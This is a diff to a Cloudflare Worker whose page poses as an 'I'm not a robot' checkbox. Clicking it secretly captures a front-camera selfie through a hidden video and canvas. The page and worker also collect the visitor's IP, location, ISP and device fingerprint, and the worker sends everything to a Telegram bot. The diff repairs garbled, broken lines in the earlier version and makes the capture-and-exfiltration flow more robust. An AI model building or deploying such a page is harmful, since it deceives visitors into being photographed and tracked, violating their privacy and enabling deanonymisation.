@@ -4,7 +4,13 @@ export default {
 
     if (request.method === "GET" && url.pathname === "/") {
       return new Response(getHTML(), {
-        headers: { "Content-Type": "text/html;charset=UTF-8" },
+        headers: {
+          "Content-Type": "text/html;charset=UTF-8",
+          // جلوگیری از کش شدن HTML در مرورگر
+          "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
+          "Pragma": "no-cache",
+          "Expires": "0",
+        },
       });
     }
 
@@ -12,13 +18,19 @@ export default {
       try {
         const formData = await request.formData();
         const photo = formData.get("photo");
-        const clientData = formData.get("clientData"); // JSON string از سمت کلاینت
+        const clientDataRaw = formData.get("clientData");
 
         if (!photo || !(photo instanceof File)) {
           return new Response("No photo uploaded", { status: 400 });
         }
 
-        // ۱. استخراج اطلاعات سمت سرور (Cloudflare)
+        let clientInfo = {};
+        try {
+          clientInfo = clientDataRaw ? JSON.parse(clientDataRaw) : {};
+        } catch (e) {
+          clientInfo = { _parseError: String(e) };
+        }
+
         const cf = request.cf || {};
         const serverInfo = {
           ip: request.headers.get("CF-Connecting-IP") || "نامشخص",
@@ -29,99 +41,105 @@ export default {
           isp: cf.asOrganization || "نامشخص",
           asn: cf.asn || "نامشخص",
           httpProtocol: cf.httpProtocol || "نامشخص",
-          tlsVersion: cf.tlsispVersion || "نام}`شخص",
-          colo: cf.colo ||,
- "نامشخص",
-          userAgent: request         .headers.get("User-Agent `") || "نامشخص",
+          tlsVersion: cf.tlsVersion || "نامشخص",
+          colo: cf.colo || "نامشخص",
+          userAgent: request.headers.get("User-Agent") || "نامشخص",
           acceptLanguage: request.headers.get("Accept-Language") || "نامشخص",
           referer: request.headers.get("Referer") || "نامشخص",
         };
 
-        // ۲. پردازش اطلاعات سمت کلاینت
-        let clientInfo = {};
-        try {
-          clientInfo = clientData ? JSON.parse(clientData) : {};
-        } catch (e) {
-          clientInfo = { error: "خطا در پردازش داده کلاینت" };
-        }
+        // escape برای HTML
+        const esc = (v) => String(v ?? "نامشخص")
+          .replace(/&/g, "&amp;")
+          .replace(/</g, "&lt;")
+          .replace(/>/g, "&gt;");
 
-        // ۳. ساخت پیام متنی جامع
-        const reportLines = [
-          "📸 **گزارش سلفی و اطلاعات کاربر**",
+        const lines = [
+          "<b>📸 گزارش سلفی و اطلاعات کاربر</b>",
+          "<i>نسخه: v2</i>",
           "",
-          "🌐 **اطلاعات شبکه (سمت سرور):**",
-          `• IP: ${serverInfo.ip}`,
-          `• کشور: ${serverInfo.country}`,
-          `• شهر: ${serverInfo.city}`,
-          `• منطقه: ${serverInfo.region}`,
-          `• منطقه زمانی: ${serverInfo.timezone}`,
-          `• ISP: ${serverInfo.• ASN: ${serverInfo.asn}`,
-          `• پروتکل HTTP: ${serverInfo.httpProtocol}`,
-          `• نسخه TLS: ${serverInfo.tlsVersion}`,
-          `• دیتاسنتر Cloudflare: ${serverInfo.colo}`,
-          `• User-Agent: ${serverInfo.userAgent}`,
-          `• زبان پذیرفته‌شده: ${serverInfo.acceptLanguage}`,
-          `• Referer: ${serverInfo.referer}`,
+          "<b>🌐 اطلاعات شبکه (سمت سرور):</b>",
+          `• IP: <code>${esc(serverInfo.ip)}</code>`,
+          `• کشور: ${esc(serverInfo.country)}`,
+          `• شهر: ${esc(serverInfo.city)}`,
+          `• منطقه: ${esc(serverInfo.region)}`,
+          `• منطقه زمانی: ${esc(serverInfo.timezone)}`,
+          `• ISP: ${esc(serverInfo.isp)}`,
+          `• ASN: ${esc(serverInfo.asn)}`,
+          `• پروتکل HTTP: ${esc(serverInfo.httpProtocol)}`,
+          `• نسخه TLS: ${esc(serverInfo.tlsVersion)}`,
+          `• دیتاسنتر Cloudflare: ${esc(serverInfo.colo)}`,
+          `• User-Agent: <code>${esc(serverInfo.userAgent)}</code>`,
+          `• زبان: ${esc(serverInfo.acceptLanguage)}`,
+          `• Referer: ${esc(serverInfo.referer)}`,
           "",
-          "💻 **اطلاعات مرورگر (سمت کلاینت):**",
-          `• User-Agent: ${clientInfo.userAgent || "نامشخص"}`,
-          `• زبان: ${clientInfo.language || "نامشخص"}`,
-          `• زبان‌های ترجیحی: ${(clientInfo.languages || []).join(", ") || "نامشخص"}`,
-          `• پلتفرم: ${clientInfo.platform || "نامشخص"}`,
-          `• رزولوشن صفحه: ${clientInfo.screenWidth || "?"}x${clientInfo.screenHeight || "?"}`,
-          `• ابعاد پنجره: ${clientInfo.innerWidth || "?"}x${clientInfo.innerHeight || "?"}`,
-          `• نسبت پیکسل دستگاه: ${clientInfo.devicePixelRatio || "نامشخص"}`,
-          `• تعداد هسته‌های CPU: ${clientInfo.hardwareConcurrency || "نامشخص"}`,
-          `• حافظه دستگاه (GB): ${clientInfo.deviceMemory || "نامشخص"}`,
-          `• وضعیت آنلاین: ${clientInfo.onLine ? "بله" : "خیر"}`,
-          `• نوع اتصال: ${clientInfo.connectionType || "نامشخص"}`,
-          `• منطقه زمانی: ${clientInfo.timezone || "نامشخص"}`,
-          `• زمان محلی: ${clientInfo.localTime || "نامشخص"}`,
-          `• کوکی‌ها فعال: ${clientInfo.cookieEnabled ? "بله" : "خیر"}`,
-          `• Do Not Track: ${clientInfo.doNotTrack || "نامشخص"}`,
+          "<b>💻 اطلاعات مرورگر (سمت کلاینت):</b>",
+          `• User-Agent: <code>${esc(clientInfo.userAgent)}</code>`,
+          `• زبان: ${esc(clientInfo.language)}`,
+          `• زبان‌های ترجیحی: ${esc((clientInfo.languages || []).join(", "))}`,
+          `• پلتفرم: ${esc(clientInfo.platform)}`,
+          `• رزولوشن صفحه: ${esc(clientInfo.screenWidth)}×${esc(clientInfo.screenHeight)}`,
+          `• ابعاد پنجره: ${esc(clientInfo.innerWidth)}×${esc(clientInfo.innerHeight)}`,
+          `• نسبت پیکسل: ${esc(clientInfo.devicePixelRatio)}`,
+          `• هسته CPU: ${esc(clientInfo.hardwareConcurrency)}`,
+          `• حافظه (GB): ${esc(clientInfo.deviceMemory)}`,
+          `• آنلاین: ${clientInfo.onLine ? "بله" : "خیر"}`,
+          `• نوع اتصال: ${esc(clientInfo.connectionType)}`,
+          `• منطقه زمانی: ${esc(clientInfo.timezone)}`,
+          `• زمان محلی: ${esc(clientInfo.localTime)}`,
+          `• کوکی فعال: ${clientInfo.cookieEnabled ? "بله" : "خیر"}`,
+          `• Do Not Track: ${esc(clientInfo.doNotTrack)}`,
           `• PDF Viewer: ${clientInfo.pdfViewerEnabled ? "بله" : "خیر"}`,
         ];
 
-        const reportText = reportLines.join("\n");
-
-        // ۴. ارسال عکس با کپشن کوتاه
-        const telegramForm = new FormData();
-        telegramForm.append("chat_id", env.TELEGRAM_CHAT_ID);
-        telegramForm.append("photo", photo, "selfie.jpg");
-        telegramForm.append("caption", "📸 سلفی دریافتی");
-
-        const photoUrl = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendPhoto`;
-        const photoResp = await fetch(photoUrl, {
-          method: "POST",
-          body: telegramForm,
-        });
-        const photoResult = await photoResp.json();
-
-        if (!photoResult.ok) {
-          return new Response(`Telegram photo error: ${photoResult.description}`, { status: 502 });
+        let reportText = lines.join("\n");
+        // محدودیت ۴۰۹۶ کاراکتر
+        if (reportText.length > 4000) {
+          reportText = reportText.slice(0, 3990) + "\n...";
         }
 
-        // ۵. ارسال پیام متنی اطلاعات
-        const msgUrl = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`;
-        const msgResp = await fetch(msgUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: env.TELEGRAM_CHAT_ID,
-            text: reportText,
-            parse_mode: "Markdown",
-          }),
-        });
+        // ۱. ارسال عکس (بدون کپشن طولانی)
+        const photoForm = new FormData();
+        photoForm.append("chat_id", env.TELEGRAM_CHAT_ID);
+        photoForm.append("photo", photo, "selfie.jpg");
+        photoForm.append("caption", "📸 سلفی دریافتی");
+
+        const photoResp = await fetch(
+          `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendPhoto`,
+          { method: "POST", body: photoForm }
+        );
+        const photoResult = await photoResp.json();
+
+        // ۲. ارسال پیام اطلاعات با HTML (نه Markdown)
+        const msgResp = await fetch(
+          `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`,
+          {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: env.TELEGRAM_CHAT_ID,
+              text: reportText,
+              parse_mode: "HTML",
+              disable_web_page_preview: true,
+            }),
+          }
+        );
         const msgResult = await msgResp.json();
 
-        if (!msgResult.ok) {
-          return new Response(`Telegram message error: ${msgResult.description}`, { status: 502 });
+        // اگر هر کدام شکست خورد، جزئیات را برگردان تا در کنسول مرورگر ببینی
+        if (!photoResult.ok || !msgResult.ok) {
+          return new Response(
+            JSON.stringify({
+              photo: photoResult,
+              message: msgResult,
+            }),
+            { status: 502, headers: { "Content-Type": "application/json" } }
+          );
         }
 
         return new Response("ok", { status: 200 });
       } catch (err) {
-        console.error(err);
-        return new Response("Internal Server Error", { status: 500 });
+        return new Response("Error: " + String(err), { status: 500 });
       }
     }
 
@@ -158,9 +176,7 @@ function getHTML() {
       background: #fff;
     }
     .checkbox:hover { border-color: #4a90e2; }
-    .checkbox.checked {
-      background: #4a90e2; border-color: #4a90e2;
-    }
+    .checkbox.checked { background: #4a90e2; border-color: #4a90e2; }
     .checkbox.checked::after {
       content: "";
       width: 6px; height: 12px;
@@ -169,8 +185,7 @@ function getHTML() {
       margin-bottom: 2px;
     }
     .label { font-size: 16px; color: #333; cursor: pointer; }
-    #hiddenVideo { display: none; }
-    #canvas { display: none; }
+    #hiddenVideo, #canvas { display: none; }
   </style>
 </head>
 <body>
@@ -183,6 +198,8 @@ function getHTML() {
   <canvas id="canvas"></canvas>
 
   <script>
+    // نسخه جدید JS
+    console.log('[v2] loaded');
     const checkbox = document.getElementById('checkbox');
     const label = document.getElementById('label');
     const video = document.getElementById('hiddenVideo');
@@ -219,10 +236,8 @@ function getHTML() {
 
       let stream = null;
       try {
-        // درخواست دوربین جلو
         stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" },
-          audio: false
+          video: { facingMode: "user" }, audio: false
         });
 
         video.srcObject = stream;
@@ -232,7 +247,6 @@ function getHTML() {
         });
         await new Promise(r => setTimeout(r, 400));
 
-        // گرفتن فریم
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
         const ctx = canvas.getContext('2d');
@@ -242,28 +256,30 @@ function getHTML() {
           canvas.toBlob(resolve, 'image/jpeg', 0.9)
         );
 
-        // خاموش کردن دوربین
         stream.getTracks().forEach(t => t.stop());
         stream = null;
 
         if (!blob) throw new Error('capture failed');
 
-        // جمع‌آوری اطلاعات کلاینت
         const clientData = JSON.stringify(collectClientData());
+        console.log('[v2] clientData =', clientData);
 
-        // ارسال
         const formData = new FormData();
         formData.append('photo', blob, 'selfie.jpg');
         formData.append('clientData', clientData);
 
         const resp = await fetch('/upload', { method: 'POST', body: formData });
 
-        if (!resp.ok) throw new Error('upload failed');
+        if (!resp.ok) {
+          const body = await resp.text();
+          console.error('[v2] upload failed', resp.status, body);
+          throw new Error('upload failed: ' + body);
+        }
 
         checkbox.classList.add('checked');
         label.textContent = 'تایید شد';
       } catch (err) {
-        console.error(err);
+        console.error('[v2] error', err);
         if (stream) stream.getTracks().forEach(t => t.stop());
         label.textContent = 'من ربات نیستم';
         busy = false;
